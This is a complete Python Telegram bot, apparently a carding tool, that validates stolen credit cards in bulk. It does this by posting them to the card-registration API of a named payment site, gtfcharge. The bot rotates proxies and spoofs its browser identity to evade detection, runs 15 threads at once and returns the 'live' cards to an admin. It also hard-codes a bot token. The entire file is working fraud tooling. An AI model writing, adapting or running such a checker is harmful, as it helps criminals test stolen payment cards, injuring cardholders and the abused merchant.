#!/usr/bin/env python3
# cc_bot.py — single-file gtfcharge CC checker bot
# pip install python-telegram-bot==21.6 requests
# run: python cc_bot.py

import io
import os
import re
import time
import itertools
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

# ───────────────────── config ─────────────────────
BOT_TOKEN    = os.getenv("BOT_TOKEN", "8828944067:AAE0I4f8cf4VdCNd5WqzB5GnP5A2NT-ysvU")
ADMIN_IDS    = [int(x) for x in os.getenv("ADMIN_IDS", "8712347172").split(",") if x.strip()]
PROXY_FILE   = os.getenv("PROXY_FILE", "proxies.txt")
HITS_FILE    = os.getenv("HITS_FILE",  "hits.txt")
THREADS      = int(os.getenv("THREADS", "15"))
TIMEOUT      = int(os.getenv("TIMEOUT", "25"))
MAX_FAILS    = 3
ROTATE_EVERY = 5

# proxy aging
PX_TEST_URL  = "http://httpbin.org/ip"
PX_TIMEOUT   = 10
PX_WORKERS   = 30
PX_MAX_AGE   = 15.0

BASE       = "https://gtfcharge.com"
COUNTRY_ID = "50"
FORM_URL   = f"{BASE}/transaction/html?Action=ccForm"
PAY_URL    = f"{BASE}/api/transaction?Action=pay&country_id={COUNTRY_ID}"
CARD_URL   = f"{BASE}/api/creditcard"

UA = ("Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")

HEADERS = {
    "User-Agent": UA,
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Language": "en-US,en;q=0.9",
}

# ───────────────────── luhn / card parsing ─────────────────────
def luhn(num: str) -> bool:
    if not num.isdigit() or len(num) < 12:
        return False
    total, alt = 0, False
    for ch in reversed(num):
        d = int(ch)
        if alt:
            d *= 2
            if d > 9: d -= 9
        total += d
        alt = not alt
    return total % 10 == 0


def parse_card(line: str):
    s = line.strip()
    if not s or s.startswith("#"): return None
    delim = next((d for d in ("|", ":", " ", ";", ",") if d in s), None)
    if not delim: return None
    parts = [p.strip() for p in s.split(delim)]
    if len(parts) < 4: return None
    number = re.sub(r"\D", "", parts[0])
    month  = parts[1].zfill(2)
    year   = parts[2]
    year   = ("20" + year) if len(year) == 2 else year
    cvv    = re.sub(r"\D", "", parts[3])
    if len(number) < 13 or len(cvv) < 3: return None
    return {"raw": s, "number": number, "month": month, "year": year,
            "cvv": cvv, "bin": number[:6], "luhn_ok": luhn(number)}

# ───────────────────── proxy helpers ─────────────────────
def norm_proxy(line: str):
    line = line.strip()
    if not line or line.startswith("#"): return None
    if "@" in line:
        return f"http://{line}"
    parts = line.split(":")
    if len(parts) == 2:
        return f"http://{line}"
    if len(parts) == 4:
        h, pt, u, pw = parts
        return f"http://{u}:{pw}@{h}:{pt}"
    return f"http://{line}"


def check_proxy(proxy: str):
    proxies = {"http": proxy, "https": proxy}
    t0 = time.time()
    try:
        r = requests.get(PX_TEST_URL, proxies=proxies, timeout=PX_TIMEOUT,
                         headers={"User-Agent": UA}, verify=False)
        dt = time.time() - t0
        if r.status_code == 200:
            try:
                ip = r.json().get("origin", "?")
            except Exception:
                ip = "?"
            return (proxy, dt <= PX_MAX_AGE, dt, ip)
        return (proxy, False, dt, f"http_{r.status_code}")
    except Exception as e:
        return (proxy, False, time.time() - t0, type(e).__name__)


class ProxyPool:
    def __init__(self):
        self.proxies = []
        self.fails = {}
        self.lock = threading.Lock()
        self._rr = None
        self._load()

    def _load(self):
        if not os.path.isfile(PROXY_FILE): return
        with open(PROXY_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                p = norm_proxy(line)
                if p and p not in self.proxies:
                    self.proxies.append(p)
                    self.fails[p] = 0
        self._reindex()

    def _reindex(self):
        self._rr = itertools.cycle(range(len(self.proxies))) if self.proxies else None

    def _save(self):
        with open(PROXY_FILE, "w", encoding="utf-8") as f:
            for p in self.proxies:
                f.write(p.replace("http://", "") + "\n")

    def add_many(self, new_proxies):
        added = []
        with self.lock:
            for p in new_proxies:
                if p not in self.proxies:
                    self.proxies.append(p)
                    self.fails[p] = 0
                    added.append(p)
            self._reindex()
            self._save()
        return added

    def has(self): return bool(self.proxies)

    def pick(self):
        with self.lock:
            if not self.proxies: return None
            for _ in range(len(self.proxies)):
                p = self.proxies[next(self._rr)]
                if self.fails.get(p, 0) < MAX_FAILS:
                    return p
            return None

    def penalize(self, p):
        if p is None: return
        with self.lock:
            self.fails[p] = self.fails.get(p, 0) + 1

    def stats(self):
        with self.lock:
            total = len(self.proxies)
            dead = sum(1 for p in self.proxies if self.fails.get(p, 0) >= MAX_FAILS)
            return {"total": total, "dead": dead, "live": total - dead}

POOL = ProxyPool()

# ───────────────────── gateway session ─────────────────────
def make_session(proxy=None):
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=(500, 502, 503, 504),
                  allowed_methods=frozenset(["GET", "POST"]))
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=4))
    s.mount("http://",  HTTPAdapter(max_retries=retry, pool_maxsize=4))
    s.headers.update(HEADERS)
    s.verify = False
    if proxy: s.proxies = {"http": proxy, "https": proxy}
    return s


def classify(code, body):
    if code < 0: return "ERROR", body
    b = body.lower()
    if "captcha" in b and "success" not in b: return "CAPTCHA", body
    if any(k in b for k in ("3dsecure","3d secure",'"3ds"',"three_d","redirect")):
        return "3DS", body
    if any(k in b for k in ('"approved"','"success"','"status":"ok"','"ok":true')):
        return "LIVE", body
    return "DEAD", body


def check_card(session, card):
    if not card["luhn_ok"]:
        return "DEAD", "LUHN_FAIL", 0
    try:
        session.get(FORM_URL, timeout=TIMEOUT, headers={"Referer": BASE + "/"})
        session.get(PAY_URL,  timeout=TIMEOUT, headers={"Referer": FORM_URL})
        data = {
            "Action": "register",
            "card[save]": "yes",
            "card[country]": COUNTRY_ID,
            "card[cc_number]": card["number"],
            "card[cc_exp_month]": card["month"],
            "card[cc_exp_year]": card["year"],
            "card[cardholder]": "John Smith",
            "card[cc_ccv]": card["cvv"],
        }
        r = session.post(CARD_URL, data=data, timeout=TIMEOUT,
                         headers={"Referer": FORM_URL})
        st, body = classify(r.status_code, r.text)
        return st, body.strip(), r.status_code
    except requests.RequestException as e:
        return "ERROR", f"{type(e).__name__}: {e}", -1

# ───────────────────── bulk runner ─────────────────────
def run_bulk(lines, on_result, progress_cb=None):
    total = len(lines)
    counts = {"LIVE":0,"3DS":0,"DEAD":0,"CAPTCHA":0,"ERROR":0,"SKIP":0}
    lock = threading.Lock()
    done = [0]

    def worker(chunk):
        session, proxy, used = None, None, 0
        def new_session():
            nonlocal session, proxy, used
            proxy = POOL.pick() if POOL.has() else None
            session = make_session(proxy)
            used = 0
        new_session()
        for line in chunk:
            card = parse_card(line)
            if not card:
                with lock:
                    counts["SKIP"] += 1
                    done[0] += 1
                if progress_cb: progress_cb(done[0], total, counts)
                continue
            status, body, code = check_card(session, card)
            if status == "ERROR" and proxy:
                POOL.penalize(proxy)
            with lock:
                counts[status] = counts.get(status, 0) + 1
                done[0] += 1
            on_result(status, card, body, code, proxy)
            if progress_cb: progress_cb(done[0], total, counts)
            used += 1
            if ROTATE_EVERY and used >= ROTATE_EVERY:
                new_session()

    n = max(1, THREADS)
    chunks = [[] for _ in range(n)]
    for i, l in enumerate(lines):
        chunks[i % n].append(l)
    with ThreadPoolExecutor(max_workers=n) as ex:
        list(ex.map(worker, chunks))

# ───────────────────── hits log ─────────────────────
def log_hit(status, card, body, code, proxy):
    with open(HITS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{status} | {card['raw']} | bin={card['bin']} | http={code} | {body}\n")

# ───────────────────── telegram ─────────────────────
def is_admin(uid): return uid in ADMIN_IDS

async def guard(update: Update) -> bool:
    if not is_admin(update.effective_user.id):
        await update.effective_message.reply_text("not for you.")
        return False
    return True


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    txt = (
        "*gtfcharge cc bot*\n\n"
        "/check `cc|mm|yyyy|cvv` — single card\n"
        "/bulk — reply to .txt file\n"
        "/addpxy — reply to .txt with proxies (aged check)\n"
        "/pxystats — proxy pool status\n"
        "/stats — session stats\n"
        "/clear — reset counters\n"
        "/id — your telegram id\n"
    )
    await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN)


async def cmd_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"your id: `{update.effective_user.id}`",
                                    parse_mode=ParseMode.MARKDOWN)


async def cmd_pxystats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    s = POOL.stats()
    txt = (f"*proxy pool*\n"
           f"total: `{s['total']}`\n"
           f"live : `{s['live']}`\n"
           f"dead : `{s['dead']}`")
    await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN)


async def cmd_addpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("reply to a `.txt` with proxies (one per line).",
                             parse_mode=ParseMode.MARKDOWN)
        return
    doc = msg.reply_to_message.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("only .txt."); return

    f = await doc.get_file()
    buf = io.BytesIO()
    await f.download_to_memory(buf)
    buf.seek(0)
    raw = [l.decode("utf-8","ignore").strip() for l in buf.getvalue().splitlines()]
    candidates = [norm_proxy(l) for l in raw if norm_proxy(l)]
    seen = set(); uniq = []
    for p in candidates:
        if p not in seen:
            seen.add(p); uniq.append(p)
    if not uniq:
        await msg.reply_text("no valid proxy lines."); return

    status_msg = await msg.reply_text(
        f"aging {len(uniq)} proxies… (concurrency {PX_WORKERS})")
    t0 = time.time()
    good, bad = [], []
    done = [0]; last_edit = [0.0]
    import asyncio

    with ThreadPoolExecutor(max_workers=PX_WORKERS) as ex:
        for proxy, ok, dt, ip in ex.map(check_proxy, uniq):
            done[0] += 1
            (good if ok else bad).append((proxy, dt, ip))
            now = time.time()
            if now - last_edit[0] > 1.5 and done[0] < len(uniq):
                last_edit[0] = now
                pct = int(100*done[0]/len(uniq))
                bar = "█"*(pct//10) + "░"*(10-pct//10)
                try:
                    asyncio.create_task(status_msg.edit_text(
                        f"*aging proxies* — {done[0]}/{len(uniq)}\n"
                        f"`{bar}` {pct}%\n"
                        f"✅ {len(good)} · ❌ {len(bad)}",
                        parse_mode=ParseMode.MARKDOWN))
                except Exception:
                    pass

    added = POOL.add_many([p for p,_,_ in good])
    dt_total = time.time() - t0
    top = sorted(good, key=lambda x: x[1])[:10]
    preview = "\n".join(
        f"`{p.replace('http://','').split('@')[-1]}` — `{dt:.2f}s` ip=`{ip}`"
        for p, dt, ip in top) or "_none_"

    summary = (
        f"*proxy aging done* — {dt_total:.1f}s\n\n"
        f"✅ live : `{len(good)}`\n"
        f"❌ dead : `{len(bad)}`\n"
        f"➕ added : `{len(added)}`\n"
        f"📦 pool  : `{POOL.stats()['total']}`\n\n"
        f"*fastest 10:*\n{preview}")
    await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN)


async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    if not ctx.args:
        await update.message.reply_text("usage: /check `cc|mm|yyyy|cvv`",
                                        parse_mode=ParseMode.MARKDOWN); return
    line = " ".join(ctx.args)
    card = parse_card(line)
    if not card:
        await update.message.reply_text("couldn't parse."); return
    msg = await update.message.reply_text("checking…")
    results = []
    def on_result(status, c, body, code, proxy):
        results.append((status, c, body, code, proxy))
        log_hit(status, c, body, code, proxy)
    run_bulk([line], on_result)
    status, c, body, code, proxy = results[0]
    emoji = {"LIVE":"✅","3DS":"🔐","DEAD":"❌",
             "CAPTCHA":"🟡","ERROR":"⚠️","SKIP":"⏭"}.get(status,"❔")
    pdisp = f"via `{proxy.replace('http://','').split('@')[-1]}`\n" if proxy else ""
    txt = (f"{emoji} *{status}*\n"
           f"`{c['raw']}`\n"
           f"bin `{c['bin']}` | http `{code}`\n"
           f"{pdisp}"
           f"```{(body or '')[:400]}```")
    await msg.edit_text(txt, parse_mode=ParseMode.MARKDOWN)


async def cmd_bulk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            "reply to a `.txt` file with `/bulk`.\n"
            "one card per line: `cc|mm|yyyy|cvv`",
            parse_mode=ParseMode.MARKDOWN); return
    doc = msg.reply_to_message.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("only .txt."); return
    f = await doc.get_file()
    buf = io.BytesIO()
    await f.download_to_memory(buf)
    buf.seek(0)
    lines = [l.decode("utf-8","ignore").strip()
             for l in buf.getvalue().splitlines() if l.strip()]
    if not lines:
        await msg.reply_text("empty file."); return

    stat = {"live":0,"3ds":0,"dead":0,"err":0}
    live_cards = []
    status_msg = await msg.reply_text(
        f"starting bulk: {len(lines)} cards, {THREADS} threads…")
    last_edit = [0.0]

    def progress(done, total, counts):
        now = time.time()
        if now - last_edit[0] < 2 and done < total: return
        last_edit[0] = now
        try:
            pct = int(100*done/total) if total else 0
            bar = "█"*(pct//10) + "░"*(10-pct//10)
            txt = (f"*bulk running* — {done}/{total}\n"
                   f"`{bar}` {pct}%\n"
                   f"✅ {counts['LIVE']} · 🔐 {counts['3DS']} · "
                   f"❌ {counts['DEAD']} · ⚠️ {counts['ERROR']}")
            import asyncio
            asyncio.create_task(status_msg.edit_text(txt, parse_mode=ParseMode.MARKDOWN))
        except Exception:
            pass

    def on_result(status, card, body, code, proxy):
        log_hit(status, card, body, code, proxy)
        if status == "LIVE":
            stat["live"] += 1; live_cards.append(f"✅ `{card['raw']}`")
        elif status == "3DS":
            stat["3ds"] += 1; live_cards.append(f"🔐 `{card['raw']}`")
        elif status == "DEAD": stat["dead"] += 1
        elif status == "ERROR": stat["err"] += 1

    t0 = time.time()
    run_bulk(lines, on_result, progress_cb=progress)
    dt = time.time() - t0

    summary = (
        f"*bulk done* — {len(lines)} cards in {dt:.1f}s\n\n"
        f"✅ LIVE: `{stat['live']}`\n"
        f"🔐 3DS: `{stat['3ds']}`\n"
        f"❌ DEAD: `{stat['dead']}`\n"
        f"⚠️ ERR: `{stat['err']}`")
    await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN)

    if live_cards:
        hits = io.BytesIO("\n".join(live_cards).encode())
        hits.name = f"hits_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
        await msg.reply_document(document=hits, caption="live + 3ds")


SESSION = {"live":0,"3ds":0,"dead":0,"err":0,"start":datetime.utcnow()}

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    uptime = (datetime.utcnow() - SESSION["start"]).total_seconds()
    txt = (f"*session stats*\n"
           f"uptime: `{int(uptime)}s`\n\n"
           f"✅ LIVE: `{SESSION['live']}`\n"
           f"🔐 3DS: `{SESSION['3ds']}`\n"
           f"❌ DEAD: `{SESSION['dead']}`\n"
           f"⚠️ ERR: `{SESSION['err']}`")
    await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN)


async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    for k in ("live","3ds","dead","err"): SESSION[k] = 0
    SESSION["start"] = datetime.utcnow()
    await update.message.reply_text("cleared.")

# ───────────────────── main ─────────────────────
def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("invalid BOT_TOKEN."); return
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("id",       cmd_id))
    app.add_handler(CommandHandler("check",    cmd_check))
    app.add_handler(CommandHandler("bulk",     cmd_bulk))
    app.add_handler(CommandHandler("addpxy",   cmd_addpxy))
    app.add_handler(CommandHandler("pxystats", cmd_pxystats))
    app.add_handler(CommandHandler("stats",    cmd_stats))
    app.add_handler(CommandHandler("clear",    cmd_clear))
    print("bot up.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()